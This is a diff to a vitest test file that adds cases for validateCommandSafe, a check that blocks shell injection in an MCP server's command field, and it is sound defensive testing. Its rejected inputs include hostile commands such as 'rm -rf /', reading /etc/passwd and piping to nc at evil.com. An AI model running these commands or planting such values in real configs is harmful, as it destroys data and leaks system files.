@@ -20,7 +20,12 @@
 
 import { afterEach, beforeEach, describe, expect, it } from 'vitest'
 
-import { deepInterpolate, interpolateEnv, validateServerConfig } from '../../src/main/services/mcp-helpers'
+import {
+  deepInterpolate,
+  interpolateEnv,
+  validateCommandSafe,
+  validateServerConfig,
+} from '../../src/main/services/mcp-helpers'
 
 // 固定的 env key 前缀,避免和其它测试或系统变量冲突
 const ENV_A = 'MCP_HELPERS_TEST_A'
@@ -193,5 +198,52 @@ describe('mcp-helpers: validateServerConfig', () => {
   ['sse url 不是 string (number)', { id: 's', name: 'S', enabled: true, transport: 'sse', url: 123 }, false],
  ])('%s → 期望返回 %s', (_name, input, expected) => {
   expect(validateServerConfig(input)).toBe(expected)
+ })
+})
+
+// =============================================================
+// validateCommandSafe — stdio server command 字段的 shell 注入防御
+//
+// connectTransport 会把 mcp.yaml 的 command 直接传给 spawn。如果
+// command 含 ;&|`$<> 或 $(...) / ${...} 命令替换,在 shell 模式下
+// 会变成任意命令执行。此 type guard 是 spawn 之前唯一的安全校验,
+// 必须拦截所有危险元字符,同时放行 Windows 路径 (\ 和 C:)。
+// =============================================================
+
+describe('validateCommandSafe', () => {
+ it('接受普通命令名', () => {
+  expect(validateCommandSafe('npx')).toBe(true)
+  expect(validateCommandSafe('uvx')).toBe(true)
+  expect(validateCommandSafe('node')).toBe(true)
+  expect(validateCommandSafe('python3')).toBe(true)
+ })
+
+ it('接受带路径的命令', () => {
+  expect(validateCommandSafe('/usr/local/bin/npx')).toBe(true)
+  expect(validateCommandSafe('./bin/server')).toBe(true)
+  expect(validateCommandSafe('C:\\Program Files\\node\\npx.exe')).toBe(true)
+ })
+
+ it('拒绝 shell 元字符(命令注入)', () => {
+  expect(validateCommandSafe('npx && rm -rf /')).toBe(false)
+  expect(validateCommandSafe('npx; cat /etc/passwd')).toBe(false)
+  expect(validateCommandSafe('npx | nc evil.com 4444')).toBe(false)
+  expect(validateCommandSafe('npx `whoami`')).toBe(false)
+  expect(validateCommandSafe('npx $(id)')).toBe(false)
+  expect(validateCommandSafe('npx > /tmp/x')).toBe(false)
+  expect(validateCommandSafe('npx < /etc/passwd')).toBe(false)
+  expect(validateCommandSafe('npx & background')).toBe(false)
+ })
+
+ it('拒绝空或非字符串', () => {
+  expect(validateCommandSafe('')).toBe(false)
+  expect(validateCommandSafe('   ')).toBe(false)
+  expect(validateCommandSafe(null as unknown as string)).toBe(false)
+  expect(validateCommandSafe(undefined as unknown as string)).toBe(false)
+ })
+
+ it('拒绝超长命令(>512 字符)', () => {
+  expect(validateCommandSafe('a'.repeat(513))).toBe(false)
+  expect(validateCommandSafe('a'.repeat(512))).toBe(true)
  })
 })
